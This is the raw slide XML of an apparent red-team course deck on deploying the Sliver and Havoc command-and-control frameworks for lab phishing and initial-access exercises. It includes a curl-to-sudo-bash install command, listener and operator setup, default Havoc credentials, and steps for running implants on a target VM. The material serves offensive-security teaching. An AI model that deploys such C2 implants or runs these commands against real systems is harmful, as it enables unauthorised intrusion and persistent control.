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sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="332" r:id="rId5"/>
    <p:sldId id="334" r:id="rId6"/>
    <p:sldId id="333" r:id="rId7"/>
    <p:sldId id="259" r:id="rId8"/>
    <p:sldId id="335" r:id="rId9"/>
    <p:sldId id="265" r:id="rId10"/>
    <p:sldId id="313" r:id="rId11"/>
    <p:sldId id="336" r:id="rId12"/>
    <p:sldId id="262" r:id="rId13"/>
    <p:sldId id="269" r:id="rId14"/>
    <p:sldId id="337" r:id="rId15"/>
    <p:sldId id="268" r:id="rId16"/>
    <p:sldId id="263" r:id="rId17"/>
    <p:sldId id="338" r:id="rId18"/>
    <p:sldId id="330" r:id="rId19"/>
    <p:sldId id="331" r:id="rId20"/>
    <p:sldId id="264" r:id="rId21"/>
    <p:sldId id="339" r:id="rId22"/>
    <p:sldId id="316" r:id="rId23"/>
    <p:sldId id="329" r:id="rId24"/>
    <p:sldId id="267" r:id="rId25"/>
    <p:sldId id="314" r:id="rId26"/>
    <p:sldId id="266" r:id="rId27"/>
    <p:sldId id="270" r:id="rId28"/>
    <p:sldId id="340" r:id="rId29"/>
    <p:sldId id="271" r:id="rId30"/>
    <p:sldId id="275" r:id="rId31"/>
    <p:sldId id="273" r:id="rId32"/>
    <p:sldId id="274" r:id="rId33"/>
    <p:sldId id="276" r:id="rId34"/>
    <p:sldId id="277" r:id="rId35"/>
    <p:sldId id="278" r:id="rId36"/>
    <p:sldId id="272" r:id="rId37"/>
    <p:sldId id="279" r:id="rId38"/>
    <p:sldId id="280" r:id="rId39"/>
    <p:sldId id="281" r:id="rId40"/>
    <p:sldId id="282" r:id="rId41"/>
    <p:sldId id="283" r:id="rId42"/>
    <p:sldId id="284" r:id="rId43"/>
    <p:sldId id="285" r:id="rId44"/>
    <p:sldId id="341" r:id="rId45"/>
    <p:sldId id="286" r:id="rId46"/>
    <p:sldId id="287" r:id="rId47"/>
    <p:sldId id="342" r:id="rId48"/>
    <p:sldId id="288" r:id="rId49"/>
    <p:sldId id="289" r:id="rId50"/>
    <p:sldId id="290"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61759"/>
    <a:srgbClr val="3F34CC"/>
    <a:srgbClr val="9954CC"/>
    <a:srgbClr val="FF434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32" autoAdjust="0"/>
    <p:restoredTop sz="93223" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="75" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="552"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9B24E3-EF7A-4EE3-B072-7D1964D57867}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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EC1321-5298-4180-A432-B3979DE8FA9A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5033163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BEC1321-5298-4180-A432-B3979DE8FA9A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18556423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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20605689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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3222861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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22241600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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10385799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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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37155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33571050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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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37155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3089498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4757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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37155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40510511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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12616885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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3612927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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28627098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54757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25774429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4757C8-8300-4AE2-BCB8-1DB7240F029F}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/22/2026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7155A1-18B5-4D37-A441-F2D3642A0572}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42165376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github.com/umarniazafrid/Week-10-Task-2-Part-2-Method-2/tree/main"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github.com/umarniazafrid/Week-10-Task-3-Last-part/tree/main"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hyperlink" Target="https://www.ascii-code.com/"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Week 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepared by Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red Team Lead at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37316243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lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Week 10: C2 Frameworks &amp; Phishing Infrastructure </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1260764"/>
            <a:ext cx="12192000" cy="5597236"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Objective:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> To learn how to deploy professional Command &amp; Control (C2) infrastructure and execute targeted phishing campaigns to gain initial access to a corporate network. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 01: Deploying a C2 Framework (Sliver or Havoc) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Move away from simple reverse shells and deploy a professional </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C2 framework to manage your "implants.“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ● </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Setup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Install and configure the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sliver C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (by BishopFox) or the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Havoc C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> framework on your attack server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Listener Configuration:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set up an HTTP/HTTPS listener to receive incoming connections. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Implant Generation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Generate a basic "Beacon" or "Implant" and execute it on a target VM to establish a persistent connection. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Understand how professional attackers manage dozens of compromised systems from a single centralized dashboard. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14443821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fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Part 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Setup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Install and configure the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sliver C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (by BishopFox) or the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Havoc C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> framework on your attack server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Option A: Sliver C2 (BishopFox)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Sliver? A powerful, cross-platform implant framework with dynamic per-binary encryption and </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>support for C2 over Mutual TLS, HTTP(S), and DNS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Installation (On Kali)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl https://sliver.sh/install | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Alternative recommended </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sudo apt update &amp;&amp; sudo apt install sliver -y </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Launch Sliver Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sliver-server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. Creating an Operator &amp; Setting Up a Listener</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create an operator profile:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>new-operator --name username --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> eth0 --permissions all</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Replace  username with a handle and YOUR_KALI_IP with the IP address of your Kali machine. This generates a client configuration file for remote connections.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11463139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01600"/>
            <a:ext cx="12192000" cy="6756400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>💀 Option 2: Havoc C2 Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Havoc is a modern, malleable post-exploitation C2 framework. Unlike Sliver's CLI, Havoc provides a Qt5-based GUI for its client component. The framework is available in the Kali Linux repositories, which simplifies its installation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>1. Installation &amp; Setup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Install Havoc from the Kali repositories (recommended):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> apt update &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> apt install havoc -y</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>This installs the server and client components.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Start the Havoc Team Server:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>havoc server --profile /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>/share/havoc/profiles/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>havoc.yaotl</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14110533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15A7AF-5661-E042-6F33-44583E0FBE84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="11887200" cy="7020231"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>This command initializes the backend component that manages sessions and listeners。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Launch the Havoc Client GUI:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>havoc client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>In the connection prompt, enter the host (127.0.0.1), port (40056), and the default credentials (Neo / password1234) to log in.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Configuring a Listener &amp; Generating an Implant</a:t>
